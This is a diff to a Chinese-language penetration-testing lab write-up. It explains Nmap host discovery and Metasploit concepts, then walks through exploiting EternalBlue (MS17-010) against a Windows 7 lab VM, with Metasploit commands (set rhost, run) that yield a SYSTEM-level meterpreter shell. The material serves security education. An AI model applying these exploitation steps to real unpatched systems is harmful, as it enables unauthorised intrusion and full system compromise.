@@ -33,11 +33,102 @@ Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行�
 ## 实验环境
 
 * VMware
-* Kali Linux
-* win7
+* 攻击 Kali Linux
+* 靶机 win7
 
 ## 实验过程
 
 ### Nmap扫描
+
+---
+#### Host Discovery
+
+默认情况下，Nmap 会进行主机发现（Host Discovery），然后对它确定在线的每个主机执行端口扫描（port scan）。
+
+    使用 -Pn 跳过Host Discovery
+
+其中，Host Discovery包括（当是特权用户时，简单说root权限）：
+
+    an ICMP echo request
+    a TCP SYN packet to port 443
+    a TCP ACK packet to port 80
+    an ICMP timestamp request
+
+当由非特权用户执行时，Host Discovery只包括:
+
+    SYN packets are sent (using a connect call) to ports 80 and 443
+
+端口 open|fliter状态， 靶机防火墙设置了规则。
+
+--help 查看更多扫描模式
+
+---
+对靶机进行 ms17-010脚本扫描
+![img.png](imgs/img3.png)
+
+### Metasploit Framework
+
+---
+Metasploit 是一款强大的渗透框架。 H.D. Moore在2003年发布MSF时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为MSF团队一直都在努力开发各种攻击工具，并将它们贡献给所有MSF用户。
+
+#### 渗透攻击（Exploit）
+渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。
+
+流行的攻击技术包括：缓冲区溢出、Web应用程序漏洞攻击，以及利用配置错误等。
+#### 攻击载荷（Payload）
+攻击载何是我们期望目标系统在被渗透攻击后而执行的代码。在MSF框架中可以自由的选择、传送和植入。
+
+反弹式shell是一种从目标主机到攻击主机创建网络连接，并提供命令行shell的攻击载荷。
+
+bind shell攻击载荷则在目标主机上将命令行shell绑定到一个打开的监听端口，攻击者可以连接这些端口来取得shell交互。
+
+#### 代码（shellcode）
+shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行shell或者Meterpreter shell，这也是shellcode名称的由来。
+
+####  模块（Module）
+在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候，你可能会使用一个渗透攻击模块（Exploit module），也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用一个辅助模块（auxiliary module），用来扫描一些诸如扫描或系统查点的攻击动作。
+
+#### 监听器（Listener）
+监听器是MSF中用来等待连入网络连接的组件。举例来说，在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。
+
+#### MSF Kali下存放目录：/usr/share/MSF-framework/
+![img.png](imgs/img1.png)
+
+---
+更新 metasploit ，并开启 msfconsole
+
+    apt install metasploit-framework
+    msfconsole
+
+![img.png](imgs/img2.png)
+
+查找 Eternal-blue 漏洞
+![img.png](imgs/img4.png)
+use 2， 设置 payload，使用show options 查看攻击设置
+![img.png](imgs/img5.png)
+设置攻击目标。
+
+    set rhost 192.168.221.137
+    show options
+    run
+
+run 渗透。
+![img.png](imgs/img6.png)
+
+meterpreter shell命令
+
+    whoami
+    nt authority\system
+
+nt authority\system 代表程序以系统身份运行，系统内置的系统账户。
+system账户具有比administration更高的权限。
+
+### meterpreter
+
+后渗透。。。。
+
+meterpreter退出
+
+    ‘Ctrl + \’
 
 
